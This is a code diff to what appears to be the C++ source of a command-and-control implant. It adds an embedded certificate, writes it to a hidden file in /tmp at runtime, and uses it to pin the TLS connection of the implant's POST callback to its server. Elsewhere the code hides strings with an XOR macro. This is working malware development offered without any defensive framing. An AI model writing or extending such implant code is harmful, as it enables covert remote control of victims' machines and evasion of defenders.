@@ -1,6 +1,9 @@
 #include "implant.h"
 #include "tasks.h"
+#include "cert_embedded.h"
 
+#include <fstream>
+#include <cstdio>
 #include <string>
 #include <string_view>
 #include <iostream>
@@ -45,10 +48,17 @@ using json = nlohmann::json;
     ss << XOR_STR("https://") << serverAddress << ":" << serverPort << serverUri;
     std::string fullServerUrl = ss.str();
 
+    //write embedded cert to temporary file
+    std::string tempCertPath = "/tmp/.cert.pem";
+    {
+        std::ofstream certFile(tempCertPath, std::ios::binary);
+        certFile.write(reinterpret_cast<const char*>(cert_pem), cert_pem_len);
+    }
+
     cpr::SslOptions sslOpts = cpr::Ssl(
         cpr::ssl::VerifyHost{ true },
         cpr::ssl::VerifyPeer{ true },
-        cpr::ssl::CaInfo{ "cert.pem" }
+        cpr::ssl::CaInfo{ tempCertPath }
     );
 
     cpr::AsyncResponse asyncRequest = cpr::PostAsync(
